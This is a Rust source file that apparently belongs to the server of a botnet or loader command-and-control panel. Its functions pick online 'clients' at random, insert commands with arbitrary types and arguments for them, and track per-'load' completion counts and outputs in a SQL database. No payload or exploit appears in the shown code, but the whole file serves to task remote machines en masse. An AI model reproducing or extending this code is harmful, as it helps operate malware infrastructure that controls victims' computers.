use crate::libraries::*;

pub async fn task_clients(cmd_args: &str, cmd_type: &str, load_id: &str, amount: u64) -> () {

    let mut connection:Conn = obtain_connection().await;
    let mut connection2: Conn = obtain_connection().await;
    
    let selected_clients = connection2.query_iter("SELECT client_id from clients ORDER BY RAND()").await.unwrap().collect::<Row>().await;
    connection.query_drop("START TRANSACTION").await.unwrap();

    let mut counter: u64 = 0;
    for row in selected_clients.unwrap() {   
        if counter == amount {break}    

        let command_id = generate(8, CHARSET);
        let client_id = value_to_str(&row, 0);

        if is_client_online(&mut connection, &client_id).await {
            let command_insert_sql: std::result::Result<Vec<String>, Error> = connection.exec(  
                r"
                INSERT INTO commands (
                    command_id, client_id, load_id,
                    cmd_type, cmd_args, 
                    time_issued
                ) VALUES (
                    :command_id, :client_id, :load_id,
                    :cmd_type, :cmd_args,
                    :time_issued
                )",
                params! {
                    "command_id" => &command_id,
                    "client_id" => &client_id,
                    "load_id" => &load_id,
                    "cmd_type" => &cmd_type,
                    "cmd_args" => &cmd_args,
                    "time_issued" => get_timestamp(),
                }
            ).await;
        
            match command_insert_sql {
                Ok(_) => counter += 1,
                Err(e) => {
                    fprint("error", &format!("Tasking all clients failed: {}", e));
                    panic!()
                }
            }
        }
       
    }

    increment_load(&mut connection, &load_id, counter).await;
    connection.query_drop("COMMIT").await.unwrap();
}


/*

SELECT load_id 
FROM loads 
WHERE is_recursive = 1 
OR (
    '7tbiBXOF' NOT IN (
        SELECT load_id FROM outputs WHERE client_id = 'f649ed4bc81a0b91' AND load_id = '7tbiBXOF'
    ) 
    AND load_id = '7tbiBXOF'
    AND required_amount!= completed_amount
) LIMIT 100

*/
pub async fn is_uncompleted_load(connection: &mut Conn, client_id: &str, load_id: &str) -> bool {
    let loads_query_sql: std::result::Result<Option<String>, Error> = connection.exec_first(
        r"SELECT load_id FROM loads 
        WHERE is_recursive = 1 
        OR (
            :load_id NOT IN (
                SELECT load_id FROM outputs WHERE client_id = :client_id AND load_id = :load_id
            ) 
            AND load_id = :load_id  
            AND required_amount != completed_amount
        )
        ",
        params! {
            "client_id" => &client_id,
            "load_id" => &load_id,
        }
    ).await;

    match loads_query_sql {
        Ok(None) => {
            false
        },

        Ok(_) => {
            true
        },

        Err(ref e) => {
            fprint("error", &format!(
                "(is_uncompleted_load): {}", 
                e
            ));
            false
        }
    }
}

pub async fn increment_load(connection: &mut Conn, load_id: &str, amount: u64) -> () {
    connection.exec_drop(
        r"UPDATE loads
        SET completed_amount = completed_amount + :amount
        WHERE load_id = :load_id;
        ",
        params! {
            "load_id" => load_id,
            "amount" => amount
        }
    ).await.unwrap();
}

pub async fn is_load(connection: &mut Conn, load_id: &str) -> bool { 

    let load_query: std::result::Result<Option<String>, Error>  = connection.exec_first(
        r"SELECT load_id FROM loads WHERE load_id = :load_id",
        params! {
            "load_id" => load_id,
        }
    ).await;

    match load_query {
        Ok(None) => false,
        Ok(_) => true,
        Err(e) => {
            fprint("error", &format!("At is_load: {}", e));
            false
        },
    }
}